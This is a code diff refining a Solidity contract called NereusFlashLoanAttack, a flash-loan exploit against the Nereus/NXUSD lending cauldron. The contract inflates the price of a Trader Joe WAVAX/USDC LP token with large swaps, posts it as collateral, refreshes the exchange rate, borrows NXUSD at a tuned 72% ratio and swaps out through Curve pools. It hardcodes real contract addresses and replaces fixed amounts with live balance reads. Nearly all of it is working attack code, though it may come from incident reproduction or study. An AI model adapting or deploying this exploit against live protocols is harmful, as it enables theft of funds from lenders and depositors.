@@ -14,6 +14,8 @@ interface ICauldronV2 {
     bool skim,
     uint256 share
   ) external;
+
+  function exchangeRate() external view returns (uint256);
 }
 
 interface ITraderJoeRouter {
@@ -117,7 +119,7 @@ contract NereusFlashLoanAttack {
   ICurveMeta curvemeta = ICurveMeta(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);
 
   function exploit() public {
-    // Approve USDC and WAVAX on the router
+    // Approve USDC and WAVAX on the Trader Joe router
     usdc.approve(address(router), type(uint256).max);
     wavax.approve(address(router), type(uint256).max);
 
@@ -136,6 +138,8 @@ contract NereusFlashLoanAttack {
     // Approve USDC.e for the USDC.e - USDC stable swap curve pool so we can
     // exchange our USDC.e for USDC in the end
     usdce.approve(address(usdceusdc), type(uint256).max);
+
+    // Approve USDC.e for the Trader Joe router for the same reason
     usdce.approve(address(router), type(uint256).max);
 
     // Allow the CauldronV2 master contract to make transactions (i.e decisions)
@@ -163,13 +167,12 @@ contract NereusFlashLoanAttack {
 
     router.swapExactTokensForTokens(280000e6, 1, path, address(this), block.timestamp * 5);
 
-    // Step 2: Add 260,000 USDC and as much WAVAX (in this case, assume 20000
-    // WAVAX) into the WAVAX/USDC LP pool
+    // Step 2: Add 260,000 USDC and as much WAVAX as possible into the WAVAX/USDC LP pool
     router.addLiquidity(
       address(usdc),
       address(wavax),
       260000e6,
-      20000 ether,
+      wavax.balanceOf(address(this)),
       1,
       1,
       address(this),
@@ -183,24 +186,24 @@ contract NereusFlashLoanAttack {
     // used to borrow NXUSD with WAVAX/USDC LP as a collateral significantly,
     // which allows us to borrow a lot more than normal market price.
     router.swapExactTokensForTokens(
-      51000000e6 - 280000e6 - 260000e6, // Remaining USDC
+      usdc.balanceOf(address(this)),
       1,
       path,
       address(this),
       block.timestamp * 5
     );
 
-    // Step 4: Update the exchangeRate that the cauldron sees when lending us
-    // NXUSD for the collateral asset WAVAX/USDC Joe LP Pair
-    (bool updated, uint256 rate) = cauldron.updateExchangeRate();
-
-    require(updated, 'Exchange rate was not updated');
-
-    // Step 5: Provide all our WAVAX/USDC LP Tokens up as collateral
+    // Step 4: Provide all our WAVAX/USDC LP Tokens up as collateral
     uint256 amountLP = wavaxusdc.balanceOf(address(this));
 
     degenbox.deposit(IERC20(wavaxusdc), address(this), address(this), amountLP, amountLP);
     cauldron.addCollateral(address(this), false, amountLP);
+
+    // Step 5: Update the exchangeRate that the cauldron sees when lending us
+    // NXUSD for the collateral asset WAVAX/USDC Joe LP Pair
+    (bool updated, uint256 rate) = cauldron.updateExchangeRate();
+
+    require(updated, 'Exchange rate was not updated');
 
     // Step 6: Borrow the 72% of the collateral amount. This seems to be the
     // sweet spot, 73% and above just fails
@@ -230,7 +233,7 @@ contract NereusFlashLoanAttack {
     curvemeta.exchange_underlying(
       nxusd3crv,
       0, // Within the NXUSD3Crv pool, the 0 index in the `coins` mapping is NXUSD
-      2, // The index of the output coin, which in this case is avUSDC
+      2, // The index of the underlying output coin, which in this case is USDC.e
       nxusd.balanceOf(address(this)),
       1 // Minimum amount to get back
     );
@@ -239,8 +242,8 @@ contract NereusFlashLoanAttack {
     // Stable Swap pool, and the rest through the Trader Joe Router.
     //
     // Swapping 100% of the USDC.e through the pool, or 100% of the USDC.e
-    // through the router yields a much lower result. I found 80.8% to be
-    // the best ratio experimentally
+    // through the router yields a much lower result. I found 80.8% through the
+    // stable swap pool to be the best ratio experimentally
     uint256 optimalStableSwapPoolSwapAmount = ((usdce.balanceOf(address(this)) * 808) / 1000);
     usdceusdc.exchange(0, 1, optimalStableSwapPoolSwapAmount, 1);
 
@@ -255,12 +258,13 @@ contract NereusFlashLoanAttack {
       block.timestamp * 5
     );
 
+    // Must return true, else the flash loan will revert
     return true;
   }
 
   // Test function to use at each stage of the exploit to return any variable
   // for viewing
   function test() public view returns (uint256) {
-    return usdce.balanceOf(address(this));
+    return usdc.balanceOf(address(this));
   }
 }
